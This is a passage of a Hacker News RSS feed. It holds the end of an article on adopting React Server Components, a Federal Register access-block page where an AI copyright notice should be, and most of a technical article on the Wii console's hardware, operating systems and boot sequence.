another subtle but meaningful benefit for us: <em>legibility and maintainability</em>. Maintainers who see <span>server-only</span> at the top of a file know exactly where that file is running without having to keep a complete mental model of the component tree.</p><h2 id="so-should-i-use-react-server-components"><a href="#so-should-i-use-react-server-components"><span><span><svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" fill="none" viewBox="0 0 42 42"><path d="m18.172 15.343 3.535-3.535a5 5 0 0 1 7.071 0l1.414 1.414a5 5 0 0 1 0 7.07l-3.535 3.536M23.828 26.657l-3.535 3.535a5 5 0 0 1-7.071 0l-1.414-1.414a5 5 0 0 1 0-7.07l3.535-3.536" vector-effect="non-scaling-stroke"></path><path stroke-linecap="round" d="m25.243 16.757-8.486 8.486" vector-effect="non-scaling-stroke"></path></svg><span>Link42Icon</span></span></span><strong>So, should I use React Server Components?</strong></a></h2><p>At the end of the day, React Server Components don’t come for free. It’s not just those gotchas surrounding CSS-in-JS or React Context. It’s also the added complexity: understanding what’s running on the server and what’s running on the client, <a href="https://www.joshwcomeau.com/react/the-perils-of-rehydration/">understanding hydration</a>, incurring infrastructure costs, and of course, managing the code complexity (especially when mixing Client and Server Components). Every facet of complexity adds another surface for bugs to sneak in and for code to become less maintainable. Frameworks reduce this complexity, but they don’t eliminate it.</p><p>When deciding whether to adopt RSCs, weigh these costs against the benefits — like smaller bundle sizes and faster execution, which can be critical to SEO. Or advanced data loading patterns that can be used to optimize complex data-heavy sites. <a href="https://twitter.com/jescalan">Jeff Escalante</a>, trying to answer the same question in their <a href="https://www.youtube.com/watch?v=TJOiXyVKExg&amp;list=PLRvKvw42Rc7MoxLVE_9qM24NAjqDdbBJc&amp;index=5">Reactathon talk</a>, nailed it with this diagram:</p><p>If your team is ready to take on the mental overhead and the performance benefits are worthwhile, then RSCs might just be for you.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Artificial Intelligence and Copyright: Request for comments (203 pts)]]></title>
            <link>https://www.federalregister.gov/documents/2023/08/30/2023-18624/artificial-intelligence-and-copyright</link>
            <guid>37344993</guid>
            <pubDate>Thu, 31 Aug 2023 23:43:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.federalregister.gov/documents/2023/08/30/2023-18624/artificial-intelligence-and-copyright">https://www.federalregister.gov/documents/2023/08/30/2023-18624/artificial-intelligence-and-copyright</a>, See on <a href="https://news.ycombinator.com/item?id=37344993">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="main">
        <h3>Request Access</h3>
        

        <p>
  Due to aggressive automated scraping of FederalRegister.gov and eCFR.gov, programmatic access to these sites is limited to access to our extensive developer APIs.
</p>

<p>
  If you are human user receiving this message, we can add your IP address to a set of IPs that can access FederalRegister.gov &amp; eCFR.gov; complete the CAPTCHA (bot test) below and click "Request Access". This process will be necessary for each IP address you wish to access the site from, requests are valid for approximately one quarter (three months) after which the process may need to be repeated.
</p>

<form action="/request" method="post">
  

          

  
</form>

<p>
  <em>An official website of the United States government.</em>
</p>

<p>
  If you want to request a wider IP range, first request access for your current IP, and then use the "Site Feedback" button found in the lower left-hand side to make the request.
</p>

      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Wii Architecture – A Practical Analysis (198 pts)]]></title>
            <link>https://www.copetti.org/writings/consoles/wii/</link>
            <guid>37344096</guid>
            <pubDate>Thu, 31 Aug 2023 21:47:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.copetti.org/writings/consoles/wii/">https://www.copetti.org/writings/consoles/wii/</a>, See on <a href="https://news.ycombinator.com/item?id=37344096">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><h2 id="imagery">Supporting imagery</h2><section><ul><li><a href="#cover-model">Model</a></li><li><a href="#cover-motherboard">Motherboard</a></li><li><a href="#cover-diagram">Diagram</a></li></ul></section><hr><h2 id="a-quick-introduction">A quick introduction</h2><p>Even though the Wii lacked the state of art graphics its competitors enjoyed, new types of control and innovative software gave this console new areas to brag about.</p><p>Here we will analyse every aspect of this console, from its already-familiar hardware to its overlooked security system, including its major flaws.</p><p>Quick Note: Some sections overlap part of the previous article about the <a href="https://www.copetti.org/writings/consoles/gamecube/">GameCube</a>, so instead of repeating the information I will just put a link to the respective part of the article.</p><hr><h2 id="next-gen-controllers">Next-gen controllers</h2><p>Let’s start by discussing one of the most iconic aspects of this console: The controllers.</p><p>The main device is no other than the <strong>Wii Remote</strong> (also called ‘Wiimote’), a gadget with a similar shape of a TV remote that contains many types of input controls:</p><ul><li>For starters, it has a <strong>set of physical buttons</strong> which are used like any conventional controller.</li><li>It also contains an <strong>accelerometer</strong> to detect orientation changes, this is the main component used to achieve motion sensing.</li><li>Finally, it includes an <strong>infrared camera</strong> that, combined with the accelerometer and some Wii processing, can be used to point at the screen.<ul><li>This sensor requires the <strong>Sensor Bar</strong> (included with the console). The bar contains two sets of infrared LEDs which the camera can sense, the Wii uses triangulation to calculate the position of the Wiimote from the TV.</li></ul></li></ul><p>The remote is powered by <strong>Broadcom’s BCM2042</strong> <sup id="bibref:1"><a href="#bib:io-wiimote" role="doc-biblioref">[1]</a></sup>, a chip that includes all the necessary circuitry to become an independent Bluetooth device (CPU, RAM, ROM and, of course, a Bluetooth module). While the Wiimote is programmed to follow the ‘Bluetooth HID’ protocol to be identified as an input device, it doesn’t comply with the standard method of exchanging data (possibly to disallow being used on non-Wii systems).</p><p>Lastly, the Wiimote also includes <strong>16 KB of EEPROM</strong> to store user data and a <strong>small speaker</strong> limited to low-quality samples (3 kHz 4-bit ADPCM or 1.5 kHz 8-bit PCM).</p><h3 id="expansions">Expansions</h3><p>Nintendo shipped this system with another controller to be used on the opposite hand, the <strong>Nunchuk</strong>, this one comes with its own accelerometer, joystick and two buttons. It’s connected to a 6-pin proprietary port on the Wiimote.</p><figure><a href="https://www.copetti.org/images/consoles/wii/controllers/both.feb109bed137274f24d9c024bf132ed6981ff1060a86233f49bc6067a65dd2ca.jpg"><picture><img alt="Image" width="700" height="475" src="https://www.copetti.org/images/consoles/wii/controllers/both.feb109bed137274f24d9c024bf132ed6981ff1060a86233f49bc6067a65dd2ca.jpg" loading="lazy"></picture></a><figcaption>Nunchuk and Wiimote <sup id="bibref:2"><a href="#bib:photography-amos" role="doc-biblioref">[2]</a></sup>, respectively.</figcaption></figure><p>Other accessories were also built for this port, each one provided different types of input.</p><hr><h2 id="cpu">CPU</h2><p>After the success of Gekko, IBM presumably grabbed this design and re-branded it as ‘750CL’ for other manufacturers to use <sup id="bibref:3"><a href="#bib:cpu-ibmcl" role="doc-biblioref">[3]</a></sup>. Then, when Nintendo requested a new CPU to use with their new console, still known as ‘Revolution’ (hence the RVL prefix on their stock motherboards), IBM and Nintendo agreed to use a 750CL clocked 1.5 times the speed of Gekko. This CPU is known as <strong>Broadway</strong> <sup id="bibref:4"><a href="#bib:cpu-ibmuser" role="doc-biblioref">[4]</a></sup> and runs at <strong>729 MHz</strong>.</p><p>After having reviewed <a href="https://www.copetti.org/writings/consoles/gamecube/#cpu">Gekko</a>, I’m afraid there aren’t many changes found in the new CPU. However, this may be an advantage: GameCube developers were able to start developing their new Wii games right away thanks to all the experience they gained with Gekko. Moreover, the fact that Broadway runs 1.5x the original speed will allow them to push for more features and quality.</p><h3 id="what-about-memory">What about memory?</h3><p>This one is an interesting bit, the old GameCube memory layout has been re-arranged and enhanced with the following changes:</p><ul><li>Splash (24 MB of 1T-SRAM) now resides inside the Hollywood SoC (explained later) and it is now called <strong>MEM1</strong> <sup id="bibref:5"><a href="#bib:operating_system-memory" role="doc-biblioref">[5]</a></sup>.</li><li>ARAM (16 MB of serial SDRAM) is long <strong>gone</strong>, however…</li><li>There’s a new memory chip, <strong>MEM2</strong>, which includes <strong>64 MB of GDDR3 SDRAM</strong> for general purpose.<ul><li>This type of memory is based on the traditional DDR2 system but revamped with higher bandwidths (~2 times the original transfer rates) and reduced power consumption, which is ideal for GPUs.</li></ul></li></ul><h3 id="backwards-compatibility">Backwards compatibility</h3><p>For now, you can think of this console as a superset of the GameCube and as such, compatibility with the previous generation of games is naturally inherited. That being said, in order to make the Wii <em>fully</em> backwards compatible, the old set of external ports were brought to the Wii, these include the GameCube controller and memory card ports. However, there’s a new constraint: The new memory map is incompatible with the old one. Thus, a thin ‘emulation’ layer was implemented in software (more details in the ‘I/O’ and ‘Operating System’ section).</p><p>Regarding the GameCube accessories using the Serial/Hi-Speed socket, I’m afraid the Wii didn’t include these ports, so those accessories can’t be used here.</p><p>In later years, new revisions of the Wii saw these ports removed, unfortunately.</p><hr><h2 id="graphics">Graphics</h2><p>Similarly to the GameCube (where the graphics component, I/O interfaces and audio capabilities were combined into a single package called ‘Flipper’), the Wii follows suit and houses a big chip next to Broadway called <strong>Hollywood</strong>. In here, we find the graphics subsystem which, to be fair, is identical to Flipper’s albeit with minimal corrections.</p><p>Thus, Hollywood’s GPU still performs the same tasks that <a href="https://www.copetti.org/writings/consoles/gamecube/#graphics">Flipper’s counterpart</a> did back in the day but now enjoys <strong>1.5x</strong> the clock speed (<strong>243 MHz</strong>). This increase means that more geometry and effects can be processed during the same unit of time.</p><h3 id="functionality">Functionality</h3><p>As the 3D engine is still <a href="https://www.copetti.org/writings/consoles/gamecube/#graphics">Flipper’s</a>, instead of repeating the same pipeline overview, I will mention some interesting design changes that games had to undergo:</p><div><ul><li id="tab-2-1-standardised-widescreen-link"><a href="#tab-2-1-standardised-widescreen">Standardised Widescreen</a></li><li id="tab-2-2-screen-interaction-link"><a href="#tab-2-2-screen-interaction">Screen Interaction</a></li></ul><div><div id="tab-2-1-standardised-widescreen"><h4 id="tab-2-1-standardised-widescreen">Standardised Widescreen</h4><figure><ul><li id="tab-1-1-traditional-link"><a href="#tab-1-1-traditional">Traditional</a></li><li id="tab-1-2-wide-link"><a href="#tab-1-2-wide">Wide</a></li><li id="tab-1-3-stretched-link"><a href="#tab-1-3-stretched">Stretched</a></li></ul><figure id="tab-1-1-traditional"><a href="https://www.copetti.org/images/consoles/wii/mario/4_3.2b878280e7fce445fbae256b65aea45e292121a74c95855ec11410eced337e40.png"><picture><source type="image/webp" srcset="https://www.copetti.org/images/consoles/wii/mario/_hud9591fdc2908327b39d2e61dce1616c0_101170_fc8ca722c7dcb37e8c721bc333684ce6.webp 500w,
https://www.copetti.org/images/consoles/wii/mario/_hud9591fdc2908327b39d2e61dce1616c0_101170_258a4bd531fd3cd692fb59e5da0b3f0d.webp 640w"><img alt="Image" width="640" height="476" src="https://www.copetti.org/images/consoles/wii/mario/4_3.2b878280e7fce445fbae256b65aea45e292121a74c95855ec11410eced337e40.png" loading="lazy"></picture></a><figcaption>4:3 mode.</figcaption></figure><figure id="tab-1-2-wide"><a href="https://www.copetti.org/images/consoles/wii/mario/16_9.1ad664606ba25f6b8d3f8180fb8158c2f80f496da14fffc0a2781cdd3bdb49e9.png"><picture><source type="image/webp" srcset="https://www.copetti.org/images/consoles/wii/mario/_hu892fff9a12cfb8a745d0705be3069ca0_105332_90e22477ce45e18d129117cf5fa2c033.webp 500w,
https://www.copetti.org/images/consoles/wii/mario/_hu892fff9a12cfb8a745d0705be3069ca0_105332_886ee3bbc56d026592bc9cec55b0b27e.webp 640w"><img alt="Image" width="640" height="464" src="https://www.copetti.org/images/consoles/wii/mario/16_9.1ad664606ba25f6b8d3f8180fb8158c2f80f496da14fffc0a2781cdd3bdb49e9.png" loading="lazy"></picture></a><figcaption>16:9 mode, as composed by the video encoder.</figcaption></figure><figure id="tab-1-3-stretched"><a href="https://www.copetti.org/images/consoles/wii/mario/16_9_stretched.ca974f64cc9c7bbb1052d1df954cf7723db5b6533d6422aa5f8b8133d2a735f3.png"><picture><source type="image/webp" srcset="https://www.copetti.org/images/consoles/wii/mario/_hu99da8c5ba9c4ce264dc7bb8aea5489c9_122020_f1351c9551298cf2273cc9a7673d2c1c.webp 500w,
https://www.copetti.org/images/consoles/wii/mario/_hu99da8c5ba9c4ce264dc7bb8aea5489c9_122020_98d0b1ef08bb258c6536194a1d50e58f.webp 800w,
https://www.copetti.org/images/consoles/wii/mario/_hu99da8c5ba9c4ce264dc7bb8aea5489c9_122020_2b460ee90cca2c689b36bc7dbf9d6e15.webp 832w"><img alt="Image" width="832" height="456" src="https://www.copetti.org/images/consoles/wii/mario/16_9_stretched.ca974f64cc9c7bbb1052d1df954cf7723db5b6533d6422aa5f8b8133d2a735f3.png" loading="lazy"></picture></a><figcaption>16:9 mode, as displayed on a widescreen TV.</figcaption></figure><figcaption>Super Mario Galaxy (2007).</figcaption></figure><p>GameCube games lacked proper support for widescreen displays (that is, composing 16:9 frames, departing from the traditional 4:3). Nevertheless, Flipper’s GPU was already able to do so and a handful of games provided options to activate it, although this was still considered an exclusive feature.</p><p>Be as it may, the framebuffer remains identical and the video encoder still outputs a PAL or NTSC-compliant frame, so this ‘widescreen’ feature is instead accomplished by <strong>widening the field of view</strong> in the projection matrix. The result is a scene rendered with a larger view angle that now appears squashed horizontally. However, the widescreen TV also plays a part in this process, as it will subsequently stretch the 4:3 frame (coming from the console) and the displayed image will thus look <em>more or less</em> in the correct ratio. If you are curious, this technique is not new, it’s been used in film projection and it’s referred to as <strong>anamorphic widescreen</strong>. Also, it’s amusing how SNES developers had to deal with the <a href="https://www.copetti.org/writings/consoles/super-nintendo/#display-modalities">opposite effect</a>.</p><p>Back to the point, the Wii standardised this feature by allowing a ‘widescreen mode’ to be activated from its system settings, which in turn promoted its <em>wide</em> adoption (pun intended).</p></div><div id="tab-2-2-screen-interaction"><h4 id="tab-2-2-screen-interaction">Screen Interaction</h4><figure><a href="https://www.copetti.org/images/consoles/wii/mario/mario_galaxy.dc4152352dc96af339ff599994bc3b1e41b5f9a1092a9521799eee924b6a9877.png"><picture><source type="image/webp" srcset="https://www.copetti.org/images/consoles/wii/mario/_hu9150dac548a5b29e89b6b1b6c2b128a2_141933_43c0abf5eedd7c8e8de69617243aefcf.webp 500w,
https://www.copetti.org/images/consoles/wii/mario/_hu9150dac548a5b29e89b6b1b6c2b128a2_141933_f763576befe4aae564c7b8b06f933c92.webp 800w,
https://www.copetti.org/images/consoles/wii/mario/_hu9150dac548a5b29e89b6b1b6c2b128a2_141933_c0819455d16b9500abacd0a660f3897f.webp 832w"><img alt="Image" width="832" height="456" src="https://www.copetti.org/images/consoles/wii/mario/mario_galaxy.dc4152352dc96af339ff599994bc3b1e41b5f9a1092a9521799eee924b6a9877.png" loading="lazy"></picture></a><figcaption>Super Mario Galaxy (2007).<br>You can pick up the stars by pointing at them.</figcaption></figure><p>The new and disruptive controller design meant new types of interactions on Wii games. Since the Wiimote enabled users to point at the screen, some games like <em>Super Mario Galaxy</em> or <em>The Legend of Zelda: Twilight Princess</em> used this feature to allow the player to interact with the scenery.</p><p>In the report titled <em>Myth Debugging: Is the Wii More Demanding to Emulate than the GameCube?</em> <sup id="bibref:6"><a href="#bib:graphics-dolphin" role="doc-biblioref">[6]</a></sup>, developers of the Dolphin emulator explain that games like Super Mario Galaxy and other first-person shooters rely on the <a href="https://www.copetti.org/writings/consoles/gamecube/#tab-1-4-render">embedded z-buffer</a> to identify the object the Wiimote is pointing at and/or check how far the object is from the Wiimote cursor.</p><p>This is not a new feature per se, but a novel use of current capabilities. GameCube games didn’t depend on a multi-use controller with pointer functionality. Now, players can control the character and point at the screen at the same time.</p></div></div></div><h3 id="updated-designs">Updated Designs</h3><p>The extra megahertz of Broadway and Hollywood, combined with avant-garde designs, brought some improvements to character models. It may not be as significant as other generations, but it’s still noticeable and appreciated.</p><h3 id="video-signal">Video Signal</h3><p>Surprisingly enough, this console doesn’t use the old <a href="https://www.copetti.org/writings/consoles/super-nintendo/#a-convenient-video-out">Multi Out</a> port anymore, but a variation of it called <strong>AV Multi Out</strong> (so much for a name) with a slightly different shape. This one carries all of the previous signals plus <strong>YPbPr</strong> (known as ‘component’) <sup id="bibref:7"><a href="#bib:graphics-video" role="doc-biblioref">[7]</a></sup>. It also includes some data lines that the system uses to identify the type of cable plugged in.</p><p>Unfortunately, this medium inherits the same <a href="https://www.copetti.org/writings/consoles/gamecube/#connections">limitations</a> of the GameCube. That is, no S-Video on PAL systems and no RGB on NTSC ones. Also, RGB can only broadcast interlaced signals (no progressive). On the other side, Nintendo finally shipped a SCART cable (as an extra accessory) which finally makes use of the RGB lines (remember they were ignored since the times of the <a href="https://www.copetti.org/writings/consoles/super-nintendo/#a-convenient-video-out">SNES</a>).</p><hr><h2 id="audio">Audio</h2><p>The Wii includes the same <strong>Macronix DSP</strong> found in the <a href="https://www.copetti.org/writings/consoles/gamecube/#audio">GameCube</a>, you can take a look at that article for the detailed analysis.</p><p>Compared to the GameCube, the only major change is that, since ARAM is gone, either MEM1 or MEM2 can be used as audio buffer.</p><hr><h2 id="io">I/O</h2><p>The I/O subsystem of this console is truly a game changer (<em>if you’ll pardon the pun</em>). The interfaces are now controlled by a single module that will take care of security too. I’m talking about <strong>Starlet</strong>.</p><h3 id="the-hidden-co-processor">The hidden co-processor</h3><p>Starlet is just an <strong>ARM926EJ-S</strong> CPU wired up to most of the internal components of this console. It resides inside Hollywood, runs at <strong>243 MHz</strong> (same as Hollywood) and contains its own ROM and RAM too. Thus, you can consider Starlet an independent computer running alongside the main CPU.</p><figure><a href="https://www.copetti.org/images/consoles/wii/diagram.ed6202e358d7637b04322145011303dddb7136dfb947ef6a263168b74ad92b5f.png"><picture><img alt="Image" width="1592" height="986" src="https://www.copetti.org/images/consoles/wii/diagram.ed6202e358d7637b04322145011303dddb7136dfb947ef6a263168b74ad92b5f.png" loading="lazy"></picture></a><figcaption>Main diagram of the Wii’s architecture. Notice how Starlet is able to control most of the I/O, and even hide some from Broadway.</figcaption></figure><p>The core is similar to the one used on the <a href="https://www.copetti.org/writings/consoles/nintendo-ds/">Nintendo DS</a>, except for including two ‘special’ additions:</p><ul><li>A ‘J’ in its model name, which denotes the inclusion of <strong>Jazelle</strong>: A dedicated unit that executes 8-bit Java Bytecode. Java programs would still depend on the virtual machine (known as ‘JVM’), but some opcodes may get executed directly from the CPU. Overall, this could accelerate the execution of compiled Java code.</li><li>A dedicated <strong>Memory management unit</strong> (MMU) to enable virtual memory. Useful for general-purpose operating systems.</li></ul><p>These enhancements are a bit ‘weird’ since they are completely unused on the Wii. Nonetheless, Nintendo selected that core for Starlet. This reminds me of the first iPhone (2G), which also included an ARM CPU with Jazelle (wasted as well).</p><p>If you’re wondering, Jazelle never took off. After some iterations it was discovered that Java Bytecode just ran better on software. Later on, ARM succeeded Jazelle with ‘Thumb-2EE’ and, at the time of this writing (June 2021), both of these units have been phased out.</p><div><figure><div><a href="https://www.copetti.org/images/consoles/wii/console/front.6988a53c2c6a506b86ff4b47840ff50fb53ac07db44a03bee0151b7fe8d79545.jpeg"><picture><img alt="Image" width="316" height="1000" src="https://www.copetti.org/images/consoles/wii/console/front.6988a53c2c6a506b86ff4b47840ff50fb53ac07db44a03bee0151b7fe8d79545.jpeg" loading="lazy"></picture></a>
<a href="https://www.copetti.org/images/consoles/wii/console/back.3cc0ab4a5b5da46555801f5c7fa0b817612b53754147c030861f98b281865734.jpeg"><picture><img alt="Image" width="316" height="1000" src="https://www.copetti.org/images/consoles/wii/console/back.3cc0ab4a5b5da46555801f5c7fa0b817612b53754147c030861f98b281865734.jpeg" loading="lazy"></picture></a></div><figcaption>External I/O on the Wii.<br>The dark &amp; small front slot is an SD card reader.</figcaption></figure><p>Moving on, this ‘I/O CPU’ is tasked with arbitrating access between many I/O and Broadway, and in doing so it also takes care of security (which decides whether to allow access or not). This is especially crucial when it comes to granting access to NAND, for instance, which is where the main operating system and user data are stored.</p><p>The chip also inherits some technology from ARM, such as the <strong>Advanced Microcontroller Bus Architecture</strong> (AMBA), a protocol that facilitates the communication between devices using a set of specialised buses.</p></div><p>Having said that, Nintendo wired up the I/O in a way that makes use of two AMBA buses <sup id="bibref:8"><a href="#bib:io-diagram" role="doc-biblioref">[8]</a></sup>:</p><ul><li>The <strong>AHB Bus</strong> (AMBA High-performance Bus): As the name indicates, it’s designed for high-speed communication. Here we find:<ul><li>The <strong>NAND</strong> Interface: Accesses 512 MB of NAND Flash that stores the operating system and user data.</li><li>Two <strong>Secure Digital Input Output</strong> (SDIO) interfaces: SDIO is a protocol mainly designed for accessing an SD card, but in this case, a second one is used to control the Wi-Fi module (802.11 b/g) as well.</li><li>A <strong>USB 2.0</strong> Controller: Interfaces two external USB sockets and an internal Bluetooth 2.0 daughtercard.</li><li>A <strong>SHA-1</strong> and <strong>AES</strong> module: Reserved for security tasks (more details in the ‘Anti-Piracy’ section).</li></ul></li><li>The <strong>APB Bus</strong> (Advanced Peripheral Bus): This one is restricted to low-performance components, including:<ul><li>The <strong>Drive interface</strong>: Connects the disc reader.</li><li>The <strong>Serial interface</strong>: Connects the GameCube controllers.</li><li>The <strong>External Interface</strong> (EXI): We’ve seen this one <a href="https://www.copetti.org/writings/consoles/gamecube/#internal-io">before</a>. It communicates with other GameCube hardware, used for backwards compatibility.</li></ul></li></ul><h3 id="maintaining-compatibility">Maintaining compatibility</h3><div><figure><a href="https://www.copetti.org/images/consoles/wii/gamecube-mode.04cdbf3820e118cd6a352bf11574a64ac3d754f36589c18e2fea6954b44ae996.png"><picture><source type="image/webp" srcset="https://www.copetti.org/images/consoles/wii/_hu51b6976741b8a99282a1ee76ce159ac2_241155_bcf3914c75f467ca09e96ce3012073a1.webp 500w,
https://www.copetti.org/images/consoles/wii/_hu51b6976741b8a99282a1ee76ce159ac2_241155_12f9497cee19009e1aeecaf72454961f.webp 800w,
https://www.copetti.org/images/consoles/wii/_hu51b6976741b8a99282a1ee76ce159ac2_241155_47318771e3eb48eda9147eeb3910a11f.webp 1111w"><img alt="Image" width="1111" height="1062" src="https://www.copetti.org/images/consoles/wii/gamecube-mode.04cdbf3820e118cd6a352bf11574a64ac3d754f36589c18e2fea6954b44ae996.png" loading="lazy"></picture></a><figcaption>Wii using GameCube equipment <sup id="bibref:9"><a href="#bib:photography-amos" role="doc-biblioref">[9]</a></sup>.</figcaption></figure><p>The Wii maintains full backwards compatibility with GameCube games even though the I/O system has changed drastically. This is because Starlet can be reprogrammed when a GameCube game is executed to virtually re-map the I/O, just like the original GameCube would expect to find.</p><p>Additionally, the Real-Time Clock chip includes some spare ROM that stores bitmap fonts (the Latin and Japanese set) used by GameCube games; and SRAM to save <a href="https://www.copetti.org/writings/consoles/gamecube/#operating-system">IPL-related</a> settings.</p></div><hr><h2 id="operating-system">Operating System</h2><p>Generally speaking, there are <strong>two operating systems</strong> residing in the Wii. One is executed on Broadway (main CPU) and the other one on Starlet (I/O CPU). Both reside inside those 512 MB of NAND memory and can be updated.</p><h3 id="starlets-os">Starlet’s OS</h3><p>Starlet is already an interesting piece of hardware, but its software is even more intriguing. You see, not only does this OS have complete access to every single corner of the console, but it’s also the first thing that runs when the power button is pressed.</p><p>Starlet runs a system <em>unofficially</em> referred to as <strong>Input/Output Operating System</strong> or ‘IOS’ (please, do not confuse this with Apple’s iOS) <sup id="bibref:10"><a href="#bib:operating_system-ios" role="doc-biblioref">[10]</a></sup>. IOS is a fully-featured operating system composed of:</p><ul><li>A <strong>Microkernel</strong>: Controls the ARM9 CPU, executes <strong>processes</strong> and talks with other hardware using <strong>drivers</strong>.</li><li><strong>Drivers</strong>: Enables the communication with hardware outside the CPU (I/O).</li><li><strong>Processes</strong>: Performs a task, such as network management or implementing a file system.</li><li><strong>Cryptographic core</strong>: Accelerates encryption-related operations (<strong>AES and SHA-1 only</strong>).</li></ul><p>With this in mind, the <strong>main job of IOS is to offload the workload of the main CPU</strong> by abstracting I/O and security. For that reason, programmers don’t have to worry about those matters. In order to accomplish this, Starlet <strong>reserves between 12 and 16 MB</strong> of GDDR3 RAM for its tasks, the rest is used by Broadway and the GPU.</p><p>Broadway and Starlet communicate with each other using an <strong>Inter-Process Communication</strong> or ‘IPC’ protocol: In a nutshell, both CPUs share two registers each. One CPU can write on the other’s registers (the written data may represent a command or a value) and from there, the receiver CPU can perform a function in response.</p><p>The update system of IOS <strong>is a bit tricky</strong>: Updated IOS versions are not installed on top of old ones, but in another slot instead (the reserved area in NAND for IOS is divided into ‘slots’). This is purely <strong>for compatibility reasons</strong>, since it allows older Wii software to keep using the same IOS version it was developed for.</p><p>Nintendo often released IOS updates to improve hardware support (which was necessary when a new accessory was shipped). There’s only <strong>one exception</strong> when IOS updates actually replace older ones: When a specific version was discovered to have an exploitable vulnerability. This was only for security reasons.</p><p>When a GameCube game is inserted, a different thing happens: Starlet boots a <strong>MIOS</strong> instead. This IOS variant just orders Starlet to emulate the original <a href="https://www.copetti.org/writings/consoles/gamecube/#operating-system">IPL</a>.</p><h3 id="broadways-os">Broadway’s OS</h3><p>This one is commonly known as the <strong>System Menu</strong> and effectively runs on the main PowerPC CPU (<strong>Broadway</strong>).</p><p>Compared to IOS, I wouldn’t consider this a ‘fully fledged’ OS, but more like a ‘program’ that allows the user to perform the following operations:</p><ul><li><strong>Start the Wii/GameCube game</strong>: Only if there is a valid one inserted.</li><li><strong>Change console settings</strong>: Including time, date, video mode or sensor bar location, among others.</li><li><strong>Run apps</strong>: One of the novelties of this console is the ability to install small Wii games (called ‘WiiWare’), retro games (‘Virtual Console’ games) or just convenient applications (such as an internet browser). Nintendo called these <strong>channels</strong>, but they are also referred to as <strong>titles</strong> by the OS.<ul><li>Users can download/buy channels through a pre-installed channel called <strong>Wii Shop Channel</strong>.</li><li>Virtual Console titles embed an emulator to run the game itself. Curiously enough, the emulator is not shared across the system or even between games of the same platform. This allows to optimise the emulator for specific games.</li></ul></li><li><strong>Send/Receive messages</strong>: Wiis have a unique ID (burned in their SEEPROM chip) which can be shared to exchange messages between other Wiis. Messages can be seen on the <strong>Message Board</strong>.<ul><li>Nintendo and Wii games also used this medium to provide a newsletter as well.</li></ul></li></ul><p>Just like IOS, Nintendo released multiple updates to this system too. Some fixed security holes, others added more features. A notable new feature was the ability to store channels on the SD card.</p><p>Any program running on Broadway (including the System Menu) relies on a specific IOS version to work. When a game or a channel is booted, Starlet reboots itself using the declared version of IOS needed.</p><h3 id="update-medium">Update medium</h3><p>Nintendo refers to them as <strong>System updates</strong>. They contain the two OSes in the same package and use ordinal numbers for versioning. The last version known is <code>4.3E</code>, released in June 2010.</p><p>System update packages can be fetched from Nintendo’s Servers or game discs. Users can manually check for updates using the System Menu. Updates are forced if a game requires a specific version of IOS that is not installed (and the disc happens to contain the required packages).</p><h3 id="boot-sequence">Boot sequence</h3><p>So far we have discussed two very different operating systems that reside in this console and run concurrently. This seems fairly simple, although both have to be carefully coordinated during the start of the console to work properly afterwards.</p><p>That being said, the boot process of this console is as follows <sup id="bibref:11"><a href="#bib:operating_system-boot" role="doc-biblioref">[11]</a></sup>:</p><ol><li>User taps the ON button on the console.</li><li><strong>Boot0</strong> stage: Starlet runs a hardwired program found in its embedded Mask ROM (1.5 KB).<ul><li>In a nutshell, Starlet decrypts and checks the integrity of the first 96 KB of NAND, Starlet then calculates its hash and compares it against a saved hash found on Starlet’s embedded OTP memory. If both hashes do not match, then the console is induced in an infinite loop.</li></ul></li><li><strong>Boot1</strong> stage: Starlet runs a small program found in that aforementioned 96 KB of NAND.<ul><li>This program will just instruct Starlet to initialise (clear) the 64 MB of GDDR3 RAM, then decrypt and verify the rest of NAND.</li></ul></li><li><strong>Boot2</strong> stage: Starlet loads the initial IOS (needed for the System Menu) and then kickstarts Broadway.</li><li>Broadway starts the System Menu. The user is now in control.</li></ol><hr><h2 id="games">Games</h2><p>While new games did not always come with considerable graphical leaps, they did surprise users with the number of features they could now offer. This was thanks to the new services Nintendo shipped with the console’s launch, ranging from the new set of controls, to a standardised online infrastructure (WiiConnect24) which enabled <em>free</em> online gaming.</p><h3 id="medium">Medium</h3><p>Wii games are distributed using a proprietary disc format called <strong>Wii Optical Disc</strong> (I know, the name can’t get more obvious). Anyhow, Matsushita/Panasonic designed this format based on the traditional DVD disc while adding non-standard features, like a <strong>burst cutting area</strong> on the inner section of the disc to prevent unauthorised reproductions.</p><div><p>The Wii disc provides either <strong>4.7 GB</strong> (if single-layer) or <strong>8.54 GB</strong> (if double-layer) of space available. They often contain <strong>two partitions</strong>: The first one for system updates and the other one for the actual game.</p><p>Some games like <em>Super Smash Bros Brawl</em> included more partitions to store multiple Virtual Console games, which were executed inside the main game.</p></div><h3 id="development">Development</h3><p>As part of the tradition, Nintendo supplied a development kit. This one was called <strong>NDEV</strong> <sup id="bibref:12"><a href="#bib:games-ndev" role="doc-biblioref">[12]</a></sup> and shaped like an enlarged black <em>brick</em>. NDEV shipped with enhanced I/O and two times the amount of MEM2 (128 MB in total) for debugging purposes.</p><p>The official software suite was named <strong>Revolution SDK</strong> <sup id="bibref:13"><a href="#bib:games-rsdk" role="doc-biblioref">[13]</a></sup> and it included various tools, compilers, debuggers and frameworks to carry out development (mostly in <strong>C/C++</strong>). Nintendo distributed subsequent updates through a web portal called <strong>Warioworld.com</strong> (now offline/redirected) which only approved developers could access.</p><p>The official SDK relies on IOS calls to interact with the Wii hardware, this is why IOS updates are often correlated to SDK updates.</p><h3 id="return-to-home">Return to Home</h3><p>Considering all the software advancements of this console, it may surprise you that games <strong>still run on bare metal</strong>, which means that they have complete control of Broadway, but not of Starlet (hence, security mechanisms are implemented here). Needless to say, the game’s behaviour is still subject to Nintendo’s approval before getting distributed.</p><div><div><ul><li id="tab-5-2-reminder-link"><a href="#tab-5-2-reminder">Reminder</a></li></ul><figure id="tab-5-2-reminder"><a href="https://www.copetti.org/images/consoles/wii/ingame/strap_warning.418407004e47be1b1b1da7aded4dbcf5cc720aff24188ca663c24a8016b322b2.png"><picture><img alt="Image" width="640" height="480" 